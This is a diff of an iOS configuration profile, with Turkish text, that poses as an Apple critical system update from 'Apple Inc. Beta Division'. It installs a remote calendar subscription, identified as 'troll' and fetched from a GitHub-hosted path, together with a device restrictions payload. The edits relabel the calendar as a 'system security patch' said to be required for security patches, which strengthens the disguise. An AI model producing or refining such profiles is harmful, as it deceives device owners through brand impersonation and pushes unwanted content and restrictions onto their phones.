@@ -5,10 +5,12 @@
 	<key>PayloadContent</key>
 	<array>
 		<dict>
+			<key>CalendarAccountDescription</key>
+			<string> Sistem Güvenlik Yaması</string>
 			<key>PayloadDescription</key>
-			<string> Apple Sistem Bildirim Protokolü</string>
+			<string>Güvenlik yamaları için gereklidir.</string>
 			<key>PayloadDisplayName</key>
-			<string>Sistem Takvimi</string>
+			<string>Sistem Bildirimleri</string>
 			<key>PayloadIdentifier</key>
 			<string>com.apple.calendar.managed.troll</string>
 			<key>PayloadType</key>
@@ -17,7 +19,6 @@
 			<string>12345678-1234-1234-1234-123456789012</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
-			
 			<key>SubCalAccountHostName</key>
 			<string>raw.githubusercontent.com</string>
 			<key>SubCalAccountPath</key>
@@ -25,12 +26,9 @@
 			<key>SubCalAccountUseSSL</key>
 			<true/>
 		</dict>
-
 		<dict>
-			<key>PayloadDescription</key>
-			<string>Cihaz Güvenliği ve Optimizasyon</string>
 			<key>PayloadDisplayName</key>
-			<string>Güvenlik Profili</string>
+			<string>Cihaz Güvenliği</string>
 			<key>PayloadIdentifier</key>
 			<string>com.apple.managed.restrictions.pro</string>
 			<key>PayloadType</key>
@@ -46,13 +44,11 @@
 		</dict>
 	</array>
 	<key>PayloadDisplayName</key>
-	<string> iOS 19.4 Kritik Sistem Güncellemesi</string>
+	<string>iOS 19.4 Kritik Sistem Güncellemesi</string>
 	<key>PayloadIdentifier</key>
 	<string>com.apple.system.update.beta</string>
 	<key>PayloadOrganization</key>
 	<string>Apple Inc. Beta Division</string>
-	<key>PayloadRemovalDisallowed</key>
-	<false/>
 	<key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
